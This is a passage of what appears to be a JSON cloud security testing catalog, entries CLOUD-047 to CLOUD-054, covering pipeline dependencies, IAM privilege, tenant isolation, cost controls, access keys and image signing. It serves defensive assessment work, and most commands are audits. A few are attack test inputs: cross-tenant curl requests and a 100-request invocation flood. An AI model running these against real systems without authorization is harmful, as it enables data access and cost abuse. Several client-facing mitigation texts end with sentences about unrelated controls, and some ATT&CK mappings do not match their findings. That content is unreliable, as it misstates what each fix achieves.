+     "id": "T1195",
+     "name": "Supply Chain Compromise",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "STA",
+     "name": "Supply Chain Management, Transparency and Accountability"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-16",
+     "name": "Application Software Security"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SA",
+     "name": "System and Services Acquisition"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-047",
+   "domain": "CLOUD",
+   "title": "CI/CD Pipeline Pulls Dependencies from Unverified Sources",
+   "sequence": 760,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-1357",
+   "prerequisites": "Access to review the cloud CI/CD pipeline configuration and its dependency sources, and authorization for the review.",
+   "whatItIs": "Cloud CI/CD pipelines install dependencies (packages, actions, images) during builds. If these are pulled from unverified sources, without pinning or integrity checks, a compromised or typosquatted dependency runs in the pipeline — which holds cloud credentials. This tests dependency-source integrity in the cloud pipeline.",
+   "rootCause": "Pipelines install dependencies from public registries by floating version, and pipeline actions/images are referenced by mutable tags, without pinning or verification, so a compromised dependency executes in the trusted pipeline.",
+   "impact": "A malicious dependency in the pipeline runs with the pipeline's identity — often holding cloud deployment credentials and secrets — enabling secret theft, malicious artifact injection, and cloud compromise.",
+   "realWorldContext": "Dependency-confusion and typosquatting attacks against build pipelines have leaked cloud secrets and injected malicious artifacts, and mutable action/image tags let a compromised upstream run in the pipeline. Pinning and verifying pipeline dependencies is the fix.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Review pipeline dependency sources (package registries, actions, base images).",
+    "Assess whether dependencies/actions/images are pinned and verified.",
+    "Check for dependency-confusion exposure (internal names on public registries).",
+    "Assess the pipeline's cloud credentials and secret access.",
+    "Identify unverified sources that could inject code.",
+    "Document the pipeline dependency-source gaps."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to review the pipeline configuration.",
+    "Map dependency, action, and image sources and their pinning.",
+    "Identify floating/unpinned/unverified references.",
+    "Assess dependency-confusion risk for internal package names.",
+    "Assess the blast radius via pipeline credentials.",
+    "Document the supply-chain weaknesses."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Review dependency pinning",
+     "command": "# are packages/actions/images pinned to versions/hashes, or floating tags?"
+    },
+    {
+     "label": "Check action/image references",
+     "command": "grep -rniE 'uses:|image:' .github/workflows/ .gitlab-ci.yml   # pinned to a SHA?"
+    },
+    {
+     "label": "Assess dependency-confusion",
+     "command": "# are internal package names resolvable from public registries?"
+    },
+    {
+     "label": "Assess pipeline credentials",
+     "command": "# what cloud credentials/secrets does the pipeline hold?"
+    }
+   ],
+   "variants": [
+    "Package installed by floating version from a public registry.",
+    "Action/image referenced by a mutable tag, not a SHA.",
+    "Dependency-confusion via an internal name on a public registry.",
+    "Compromised dependency running with pipeline credentials."
+   ],
+   "mitigation": [
+    "Pin dependencies, actions, and images to versions/hashes; verify integrity.",
+    "Use trusted, internal registries/mirrors for critical dependencies.",
+    "Prevent dependency confusion (scoped names, private-registry priority).",
+    "Scope pipeline credentials to least privilege; avoid long-lived secrets.",
+    "Scan pipeline dependencies for known issues.",
+    "Review pipeline configuration for supply-chain risks."
+   ],
+   "mitigationClientFacing": "Build-and-deploy pipelines install code from outside sources, and if those aren't locked to verified versions, a compromised or look-alike package runs inside the pipeline — which holds your cloud credentials. The fix is to lock pipeline dependencies (including build actions and images) to specific verified versions, use trusted internal sources, and give the pipeline only the credentials it needs. With this in place, one team's mistake or one exposed credential stays contained rather than opening a path across your whole cloud estate.",
+   "reference": {
+    "standard": "A03:2025 - Software Supply Chain Failures",
+    "cwe": "CWE-1357",
+    "tools": [
+     "pipeline review",
+     "Trivy",
+     "dependency scanners"
+    ],
+    "links": [
+     "A03:2025 - Software Supply Chain Failures",
+     "MITRE ATT&CK T1195.001 (Compromise Software Dependencies)",
+     "MITRE ATT&CK T1552 (Unsecured Credentials)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195.001",
+     "name": "Compromise Software Dependencies and Development Tools",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "STA",
+     "name": "Supply Chain Management, Transparency and Accountability"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-5",
+     "name": "Account Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SA",
+     "name": "System and Services Acquisition"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-048",
+   "domain": "CLOUD",
+   "title": "Serverless Function Dependencies Not Scanned or Pinned",
+   "sequence": 761,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-1104",
+   "prerequisites": "Access to the serverless functions' dependency manifests and deployment packages, and authorization to scan. Dependency scanners.",
+   "whatItIs": "Serverless functions bundle their dependencies into a deployment package. If those dependencies are not pinned and scanned, vulnerable or malicious packages ship with the function and run with its cloud execution role. This tests serverless dependency supply-chain hygiene.",
+   "rootCause": "Function dependencies are installed by floating version and packaged without scanning, so vulnerable/malicious packages deploy and run with the function's cloud permissions.",
+   "impact": "A vulnerable/malicious function dependency can execute with the function's execution role — accessing cloud resources and secrets — turning a dependency flaw into cloud compromise.",
+   "realWorldContext": "Serverless functions inherit the same dependency risks as any app, but their execution roles make a compromised dependency especially valuable — it runs with cloud permissions. Pinning and scanning function dependencies is the fix, and unscanned function packages are a common gap.",
+   "difficulty": "Beginner",
+   "timeEstimate": "30-60 min",
+   "stepsToIdentify": [
+    "Enumerate serverless functions and their dependency manifests.",
+    "Assess whether dependencies are pinned (lockfiles) and scanned.",
+    "Scan function packages for known-vulnerable dependencies.",
+    "Assess the functions' execution roles and secret access.",
+    "Identify vulnerable/unpinned dependencies.",
+    "Document the serverless supply-chain gap."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to scan the functions' dependencies.",
+    "Collect function dependency manifests/packages.",
+    "Scan for known-vulnerable dependencies.",
+    "Assess pinning (lockfiles) and reachability.",
+    "Assess the execution-role blast radius.",
+    "Document the findings and remediation priority."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Scan function dependencies",
+     "command": "trivy fs ./function/   # or npm audit / pip-audit on the package"
+    },
+    {
+     "label": "Check pinning",
+     "command": "# are dependencies pinned via a lockfile (package-lock.json / poetry.lock)?"
+    },
+    {
+     "label": "Assess execution role",
+     "command": "# what cloud permissions does the function's execution role grant?"
+    },
+    {
+     "label": "Identify reachable flaws",
+     "command": "# is a vulnerable dependency actually invoked by the function?"
+    }
+   ],
+   "variants": [
+    "Vulnerable dependency bundled in the function package.",
+    "Dependencies unpinned (no lockfile).",
+    "Malicious/typosquatted package included.",
+    "Dependency flaw reachable with a broad execution role."
+   ],
+   "mitigation": [
+    "Pin function dependencies with lockfiles; verify integrity.",
+    "Scan function packages for vulnerabilities in CI.",
+    "Update vulnerable dependencies on a cadence.",
+    "Scope execution roles to least privilege.",
+    "Use trusted registries and prevent dependency confusion.",
+    "Minimize function dependencies."
+   ],
+   "mitigationClientFacing": "Serverless functions bundle code libraries that run with the function's cloud permissions, so a vulnerable or malicious library there is especially dangerous. The fix is to lock function dependencies to specific versions, scan them for known flaws before deploying, keep them updated, and give each function only the minimal cloud permissions it needs. The payoff is that sensitive data at rest stays unreadable even if a backup, snapshot, or storage bucket is somehow exposed.",
+   "reference": {
+    "standard": "A03:2025 - Software Supply Chain Failures",
+    "cwe": "CWE-1104",
+    "tools": [
+     "Trivy",
+     "npm audit",
+     "pip-audit",
+     "Snyk"
+    ],
+    "links": [
+     "A03:2025 - Software Supply Chain Failures",
+     "MITRE ATT&CK T1195.001 (Compromise Software Dependencies)",
+     "MITRE ATT&CK T1552.007 (Container/Serverless Credentials)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195.001",
+     "name": "Compromise Software Dependencies and Development Tools",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "TVM",
+     "name": "Threat and Vulnerability Management"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-7",
+     "name": "Continuous Vulnerability Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SI",
+     "name": "System and Information Integrity"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-049",
+   "domain": "CLOUD",
+   "title": "Overly-Permissive IAM Roles Grant Excessive Privilege",
+   "sequence": 762,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-269",
+   "prerequisites": "Read access to review IAM roles/policies (or credentials to enumerate them) and authorization to assess. Cloud CLI / IAM analysis tools.",
+   "whatItIs": "Cloud IAM roles and policies frequently grant far more privilege than needed — wildcard actions/resources, broad managed policies, or admin-equivalent access — by design rather than misconfiguration. This over-privilege means a compromised identity has outsized impact. This tests for excessive IAM privilege as a design weakness.",
+   "rootCause": "Least privilege is hard to scope, so broad policies (Action:*, Resource:*, admin managed policies) are granted for convenience, baking excessive privilege into the design.",
+   "impact": "An over-privileged role, if compromised (via a leaked key, SSRF, or a vulnerable workload), gives an attacker broad control of the cloud account — privilege escalation, data access, and resource abuse across the environment.",
+   "realWorldContext": "Excessive IAM privilege is the design flaw behind most cloud breach blast-radius: a single compromised over-privileged role becomes account-wide compromise. Enforcing least privilege — and analyzing for privilege-escalation paths — is the core cloud-security discipline.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Enumerate IAM roles/policies and their granted actions/resources.",
+    "Identify wildcard actions/resources and admin-equivalent policies.",
+    "Assess whether privilege matches actual need (least privilege).",
+    "Analyze for privilege-escalation paths (e.g. iam:PassRole, policy edit).",
+    "Assess the blast radius of a compromised over-privileged role.",
+    "Document the excessive-privilege design weakness."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to enumerate and assess IAM.",
+    "Collect roles/policies and their permissions.",
+    "Flag over-privileged and admin-equivalent grants.",
+    "Identify privilege-escalation paths among the permissions.",
+    "Assess the impact of compromising an over-privileged role.",
+    "Document the least-privilege gaps and escalation paths."
+   ],
+   "examplePayloads": [
+    {
+     "label": "List roles and attached policies",
+     "command": "aws iam list-roles ; aws iam list-attached-role-policies --role-name <role>"
+    },
+    {
+     "label": "Find wildcard permissions",
+     "command": "aws iam get-policy-version --policy-arn <arn> --version-id <v> | grep -E '\"Action\": \"\\*\"|\"Resource\": \"\\*\"'"
+    },
+    {
+     "label": "Analyze escalation paths",
+     "command": "# use an IAM analysis tool (e.g. PMapper/Cloudsplaining) to find privilege-escalation paths"
+    },
+    {
+     "label": "Assess blast radius",
+     "command": "# what could an attacker do with each over-privileged role?"
+    }
+   ],
+   "variants": [
+    "Action:* / Resource:* wildcard policies.",
+    "Admin-equivalent managed policy attached broadly.",
+    "iam:PassRole enabling privilege escalation.",
+    "Role privilege far exceeding actual need."
+   ],
+   "mitigation": [
+    "Enforce least privilege: grant only required actions on specific resources.",
+    "Replace wildcard and admin policies with scoped ones.",
+    "Analyze and remove privilege-escalation paths.",
+    "Use permission boundaries and SCPs to cap privilege.",
+    "Review IAM regularly with access analyzers.",
+    "Design roles around need from the start."
+   ],
+   "mitigationClientFacing": "In the cloud, 'roles' decide what each identity can do, and they're often given far more power than needed — sometimes near-admin. If one is compromised, the attacker inherits all that power. The fix is to give each role only the specific permissions it needs, remove broad wildcard and admin grants, and regularly analyze roles for ways they could be abused to gain more power.",
+   "reference": {
+    "standard": "A06:2025 - Insecure Design",
+    "cwe": "CWE-269",
+    "tools": [
+     "AWS CLI",
+     "Cloudsplaining",
+     "PMapper",
+     "ScoutSuite"
+    ],
+    "links": [
+     "A06:2025 - Insecure Design",
+     "MITRE ATT&CK T1078.004 (Cloud Accounts)",
+     "MITRE ATT&CK T1098 (Account Manipulation)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A06",
+   "categoryName": "Insecure Design",
+   "attack": [
+    {
+     "id": "T1068",
+     "name": "Exploitation for Privilege Escalation",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IAM",
+     "name": "Identity and Access Management"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-6",
+     "name": "Access Control Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "AC",
+     "name": "Access Control"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-050",
+   "domain": "CLOUD",
+   "title": "Multi-Tenant Isolation Weakness in Cloud Application Design",
+   "sequence": 763,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-1188",
+   "prerequisites": "Two tenant accounts in a multi-tenant cloud application and authorization to test cross-tenant access. Burp Suite.",
+   "whatItIs": "Multi-tenant cloud applications must isolate tenants' data and resources by design. If isolation relies on application logic that can be bypassed (predictable IDs, missing tenant checks, shared resources), one tenant can access another's data. This tests the design-level tenant isolation.",
+   "rootCause": "Tenant isolation is enforced in application logic rather than architecturally, and gaps (missing tenant scoping on a query, shared storage, guessable IDs) let cross-tenant access through.",
+   "impact": "A tenant-isolation weakness lets one customer access another's data — a severe confidentiality breach in multi-tenant SaaS, and a design flaw rather than a single bug.",
+   "realWorldContext": "Cross-tenant data access is among the most damaging SaaS vulnerabilities, and it stems from isolation designed into fragile application logic rather than enforced architecturally. Scoping every data access to the authenticated tenant, at a layer users cannot influence, is the design fix.",
+   "difficulty": "Advanced",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Map how the application isolates tenants (IDs, scoping, storage).",
+    "As tenant A, attempt to access tenant B's data via IDs, parameters, and endpoints.",
+    "Test whether tenant scoping is enforced server-side on every access.",
+    "Test shared resources (storage, caches, queues) for cross-tenant leakage.",
+    "Assess predictability of tenant/resource identifiers.",
+    "Document the tenant-isolation design weakness."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to test cross-tenant access with two tenant accounts.",
+    "Map tenant-scoping mechanisms.",
+    "From tenant A, attempt to read/modify tenant B's data.",
+    "Identify where tenant scoping is missing or bypassable.",
+    "Demonstrate cross-tenant data access.",
+    "Document the isolation weakness."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Attempt cross-tenant object access",
+     "command": "curl -s https://<target>/api/v1/records/<tenantB-record-id> -H 'Authorization: Bearer <tenantA-token>'"
+    },
+    {
+     "label": "Test tenant-parameter manipulation",
+     "command": "curl -s 'https://<target>/api/v1/data?tenant=<tenantB-id>' -H 'Authorization: Bearer <tenantA-token>'"
+    },
+    {
+     "label": "Test shared-storage leakage",
+     "command": "# check whether tenant A can access tenant B's objects in shared storage/buckets"
+    },
+    {
+     "label": "Assess ID predictability",
+     "command": "# are tenant/resource IDs sequential/guessable?"
+    }
+   ],
+   "variants": [
+    "Cross-tenant object access via predictable IDs.",
+    "Missing tenant scoping on a query/endpoint.",
+    "Shared storage leaking across tenants.",
+    "Tenant parameter honored from the client."
+   ],
+   "mitigation": [
+    "Enforce tenant scoping server-side on every data access, from authenticated context.",
+    "Do not trust client-supplied tenant identifiers.",
+    "Use unguessable identifiers and per-tenant resource isolation.",
+    "Isolate shared resources (storage, caches) per tenant.",
+    "Test cross-tenant access as a standard part of QA.",
+    "Design isolation architecturally, not just in application logic."
+   ],
+   "mitigationClientFacing": "In cloud apps that serve many customers, each customer's data must be kept separate. If that separation relies on fragile app logic — guessable IDs or a missing check — one customer can reach another's data. The fix is to enforce, on the server for every request, that a user only ever sees their own organization's data, using unguessable IDs and keeping each customer's resources separate.",
+   "reference": {
+    "standard": "A06:2025 - Insecure Design",
+    "cwe": "CWE-1188",
+    "tools": [
+     "Burp Suite",
+     "Postman",
+     "cloud CLI"
+    ],
+    "links": [
+     "A06:2025 - Insecure Design",
+     "MITRE ATT&CK T1530 (Data from Cloud Storage)",
+     "OWASP WSTG-ATHZ-04 (IDOR)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A06",
+   "categoryName": "Insecure Design",
+   "attack": [
+    {
+     "id": "T1592",
+     "name": "Gather Victim Host Information",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "CCC",
+     "name": "Change Control and Configuration Management"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-4",
+     "name": "Secure Configuration of Enterprise Assets and Software"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "CM",
+     "name": "Configuration Management"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-051",
+   "domain": "CLOUD",
+   "title": "No Rate Limiting or Cost Controls on Cloud Resources",
+   "sequence": 764,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-770",
+   "prerequisites": "A cloud application/API and authorization to test resource consumption. A scripting environment.",
+   "whatItIs": "Cloud resources scale on demand and bill by usage. If an application lacks rate limiting, quotas, and cost controls by design, an attacker can drive up consumption — spinning up compute, invoking functions, or filling storage — causing a 'denial of wallet' (large bills) or resource exhaustion. This tests for missing resource/cost controls.",
+   "rootCause": "Autoscaling and pay-per-use are convenient, and controls (rate limits, quotas, budgets/alerts) are not designed in, so unbounded consumption is possible.",
+   "impact": "An attacker can inflate cloud costs dramatically (denial of wallet), exhaust quotas to cause denial of service, or abuse resources for their own ends (e.g. cryptomining) — a business and availability harm.",
+   "realWorldContext": "'Denial of wallet' attacks — driving up a target's cloud bill via unbounded resource consumption — are a recognized cloud risk, as is resource abuse like cryptomining on compromised or unbounded services. Designing in rate limits, quotas, and budget alerts is the fix.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Identify resource-consuming operations (compute, functions, storage, expensive queries).",
+    "Assess whether rate limiting, quotas, and cost controls exist.",
+    "Test whether consumption can be driven up without limit (within authorized bounds).",
+    "Assess autoscaling behaviour under load.",
+    "Check for budget alerts and anomaly detection.",
+    "Document the resource/cost-control gaps."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to test resource consumption within agreed limits.",
+    "Map resource-consuming operations.",
+    "Drive up consumption (within authorized bounds) and observe whether it is limited.",
+    "Assess autoscaling and cost implications.",
+    "Check for quotas, budget alerts, and anomaly detection.",
+    "Document the missing controls."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Test unbounded function invocation",
+     "command": "for i in $(seq 1 100); do curl -s -X POST https://<function-url>/ & done  # within authorized limits"
+    },
+    {
+     "label": "Test expensive-operation abuse",
+     "command": "# repeatedly trigger a costly operation (large query/compute) and observe scaling/limits"
+    },
+    {
+     "label": "Assess quotas/limits",
+     "command": "# are per-user rate limits and resource quotas enforced?"
+    },
+    {
+     "label": "Check budget alerts",
+     "command": "# are cloud budget alerts and cost-anomaly detection configured?"
+    }
+   ],
+   "variants": [
+    "Unbounded function invocation inflating cost.",
+    "No per-user rate limits on expensive operations.",
+    "Autoscaling with no upper bound.",
+    "No budget alerts / cost-anomaly detection."
+   ],
+   "mitigation": [
+    "Design in rate limiting and quotas per user/tenant.",
+    "Set autoscaling upper bounds and resource limits.",
+    "Configure budgets, cost alerts, and anomaly detection.",
+    "Throttle or require verification for expensive operations.",
+    "Monitor consumption for abuse patterns.",
+    "Treat cost and availability as design constraints."
+   ],
+   "mitigationClientFacing": "Cloud resources grow on demand and you pay per use, so if an app has no limits, an attacker can run up a huge bill or exhaust resources ('denial of wallet'). The fix is to design in limits — caps on how fast and how much users can consume, autoscaling bounds — and to set up budget alerts so unusual spending is caught quickly.",
+   "reference": {
+    "standard": "A06:2025 - Insecure Design",
+    "cwe": "CWE-770",
+    "tools": [
+     "custom scripts",
+     "cloud CLI",
+     "budget alerts"
+    ],
+    "links": [
+     "A06:2025 - Insecure Design",
+     "MITRE ATT&CK T1496 (Resource Hijacking)",
+     "MITRE ATT&CK T1498 (Network Denial of Service)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A06",
+   "categoryName": "Insecure Design",
+   "attack": [
+    {
+     "id": "T1499",
+     "name": "Endpoint Denial of Service",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IVS",
+     "name": "Infrastructure and Virtualization Security"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-13",
+     "name": "Network Monitoring and Defense"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SI",
+     "name": "System and Information Integrity"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-052",
+   "domain": "CLOUD",
+   "title": "Long-Lived Cloud Access Keys Without Rotation",
+   "sequence": 765,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-798",
+   "prerequisites": "Read access to review IAM users/keys (or authorization to enumerate) and assess. Cloud CLI.",
+   "whatItIs": "Cloud access keys (e.g. AWS access key IDs/secrets) provide programmatic access. Long-lived keys that are never rotated, widely distributed, or embedded in code become a persistent, high-value target. This tests for long-lived, unrotated cloud access keys.",
+   "rootCause": "Static keys are created for convenience and left in place indefinitely, without rotation or a move to short-lived credentials, so a leaked key remains valid for a long time.",
+   "impact": "A long-lived key, if leaked (in code, logs, or a breach), grants persistent access with the key's privileges until noticed and revoked — a common cloud-breach entry point.",
+   "realWorldContext": "Leaked long-lived cloud keys are behind many cloud breaches — found in public repos, logs, and images, and valid for months because they are never rotated. Moving to short-lived credentials and rotating/retiring static keys is the fix.",
+   "difficulty": "Beginner",
+   "timeEstimate": "30-60 min",
+   "stepsToIdentify": [
+    "Enumerate IAM users and their access keys.",
+    "Assess key age and whether rotation is enforced.",
+    "Identify keys that are old, unused, or embedded in code/config.",
+    "Assess whether short-lived credentials (roles/STS) are used instead.",
+    "Check for keys in code repositories and artifacts.",
+    "Document the long-lived-key exposure."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to enumerate and assess access keys.",
+    "List access keys and their creation/last-used dates.",
+    "Flag old, unused, and embedded keys.",
+    "Assess adoption of short-lived credentials.",
+    "Where in scope, search code/artifacts for leaked keys.",
+    "Document the key-hygiene gaps."
+   ],
+   "examplePayloads": [
+    {
+     "label": "List access keys and age",
+     "command": "aws iam list-access-keys --user-name <user> ; aws iam get-access-key-last-used --access-key-id <id>"
+    },
+    {
+     "label": "Find old/unused keys",
+     "command": "# flag keys older than the rotation policy or with no recent use"
+    },
+    {
+     "label": "Search code for leaked keys",
+     "command": "git secrets --scan-history || gitleaks detect --source ."
+    },
+    {
+     "label": "Assess short-lived credential use",
+     "command": "# are roles/STS temporary credentials used instead of static keys?"
+    }
+   ],
+   "variants": [
+    "Access key never rotated (very old).",
+    "Unused key still active.",
+    "Key embedded in code/config.",
+    "Static keys used where roles/STS would suffice."
+   ],
+   "mitigation": [
+    "Prefer short-lived credentials (roles/STS, workload identity) over static keys.",
+    "Rotate any necessary long-lived keys on a schedule; retire unused keys.",
+    "Never embed keys in code/config; use a secrets manager.",
+    "Scan code and artifacts for leaked keys.",
+    "Monitor key usage and alert on anomalies.",
+    "Enforce key age/rotation policies."
+   ],
+   "mitigationClientFacing": "Cloud access keys are like long-term passwords for programs, and if they never expire and get leaked (in code or a breach), an attacker has lasting access. The fix is to use short-lived, automatically-expiring credentials instead of permanent keys where possible, rotate and retire the permanent ones, never put them in code, and watch for leaks. This ensures that when something does go wrong you have a reliable record of what happened, rather than discovering a breach only when an outsider tells you.",
+   "reference": {
+    "standard": "A07:2025 - Authentication Failures",
+    "cwe": "CWE-798",
+    "tools": [
+     "AWS CLI",
+     "gitleaks",
+     "ScoutSuite"
+    ],
+    "links": [
+     "A07:2025 - Authentication Failures",
+     "MITRE ATT&CK T1552.001 (Credentials In Files)",
+     "MITRE ATT&CK T1078.004 (Cloud Accounts)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A07",
+   "categoryName": "Authentication Failures",
+   "attack": [
+    {
+     "id": "T1552.001",
+     "name": "Credentials In Files",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "IAM",
+     "name": "Identity and Access Management"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-5",
+     "name": "Account Management"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "IA",
+     "name": "Identification and Authentication"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-053",
+   "domain": "CLOUD",
+   "title": "Unsigned Container Images Deployed Without Verification",
+   "sequence": 766,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-347",
+   "prerequisites": "Access to the container registry and deployment configuration, and authorization to review. Image-signing tools (cosign).",
+   "whatItIs": "Container images should be signed and their signatures verified before deployment, so only trusted images run. If images are deployed without signature verification, an attacker who can push to the registry or intercept the pull can run malicious images. This tests container-image integrity verification.",
+   "rootCause": "Image signing/verification (e.g. cosign + admission policy) is not implemented, so the cluster runs whatever image is referenced, trusting the registry and tag.",
+   "impact": "Without verification, a malicious or tampered image (pushed by an attacker or via a compromised tag) runs in the cluster, achieving code execution with the workload's privileges — a supply-chain integrity failure.",
+   "realWorldContext": "Deploying unsigned, unverified images lets a compromised registry or a mutable tag introduce malicious workloads. Signing images and enforcing verification at admission (so only signed images run) is the integrity control, and its absence is a common cloud gap.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Assess whether container images are signed.",
+    "Check whether deployment/admission verifies signatures before running images.",
+    "Assess registry push permissions and tag mutability.",
+    "Test whether an unsigned/tampered image would be deployed (in a test namespace).",
+    "Assess the impact of running a malicious image.",
+    "Document the image-integrity gap."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to review image signing and deployment.",
+    "Assess signing and admission verification.",
+    "In a test namespace, attempt to deploy an unsigned/tampered image.",
+    "Observe whether it is admitted and run.",
+    "Assess registry permissions and tag mutability.",
+    "Document the verification gap."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Check image signatures",
+     "command": "cosign verify <registry>/<image>:<tag>   # is the image signed and verifiable?"
+    },
+    {
+     "label": "Check admission verification",
+     "command": "# is there an admission policy (e.g. Kyverno/OPA + cosign) enforcing signed images?"
+    },
+    {
+     "label": "Test unsigned deploy (test namespace)",
+     "command": "# attempt to deploy an unsigned image; is it admitted?"
+    },
+    {
+     "label": "Assess registry/tag controls",
+     "command": "# who can push; are tags immutable?"
+    }
+   ],
+   "variants": [
+    "Unsigned image deployed without verification.",
+    "Mutable tag pointing to a tampered image.",
+    "No admission policy enforcing signed images.",
+    "Broad registry push permissions."
+   ],
+   "mitigation": [
+    "Sign images (cosign) and enforce signature verification at admission.",
+    "Use immutable tags/digests for deployments.",
+    "Restrict registry push permissions.",
+    "Verify integrity through the build-to-deploy chain.",
+    "Fail closed on unsigned/unverifiable images.",
+    "Monitor for unexpected image deployments."
+   ],
+   "mitigationClientFacing": "Container images should be digitally signed, and the cluster should only run images whose signature checks out. Without that, an attacker who can push to the image store or hijack a tag can run malicious containers. The fix is to sign your images and enforce, at deploy time, that only signed images run — and to use fixed image digests rather than movable tags.",
+   "reference": {
+    "standard": "A08:2025 - Software or Data Integrity Failures",
+    "cwe": "CWE-347",
+    "tools": [
+     "cosign",
+     "Kyverno",
+     "OPA/Gatekeeper",
+     "Trivy"
+    ],
+    "links": [
+     "A08:2025 - Software or Data Integrity Failures",
+     "MITRE ATT&CK T1610 (Deploy Container)",
+     "MITRE ATT&CK T1525 (Implant Internal Image)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A08",
+   "categoryName": "Software or Data Integrity Failures",
+   "attack": [
+    {
+     "id": "T1550",
+     "name": "Use Alternate Authentication Material",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "CSA CCM v4",
+     "code": "STA",
+     "name": "Supply Chain Management, Transparency and Accountability"
+    },
+    {
+     "standard": "CIS Controls v8",
+     "code": "CIS-16",
+     "name": "Application Software Security"
+    },
+    {
+     "standard": "NIST SP 800-53 Rev.5",
+     "code": "SI",
+     "name": "System and Information Integrity"
+    }
+   ]
+  },
+  {
+   "id": "CLOUD-054",
+   "domain": "CLOUD",
+   "title": "No Integrity Verification of Data in Cloud Storage",
+   "sequence": 767,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-353",
+   "prerequisites": "Access to the cloud storage and application handling of stored objects, and authorization to test. Cloud CLI.",
+   "whatItIs": "Applications that store and later retrieve data/objects in cloud storage should verify integrity (checksums, versioning, object-lock) so tampering is detected. If objects can be modified by an attacker with storage access without detection, integrity is not assured. This tests integrity verification of cloud-stored data.",
+   "rootCause": "Applications trust that stored objects are unchanged and do not verify integrity on retrieval, and storage may allow overwrite without versioning/object-lock, so tampering is undetectable.",
+   "impact": "Undetected tampering of stored objects (config, data, artifacts) can alter application behaviour, poison data, or serve malicious content, exploiting the missing integrity verification.",
+   "realWorldContext": "Tampering with objects in cloud storage — a modified config file, a poisoned artifact, a swapped static asset — can change application behaviour or serve malicious content, and without integrity verification it goes unnoticed. Checksums, versioning, and object-lock are the integrity controls.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Identify data/objects stored in and retrieved from cloud storage.",
+    "Assess whether integrity is verified on retrieval (checksums, ETags).",
+    "Assess whether versioning/object-lock protects against overwrite.",
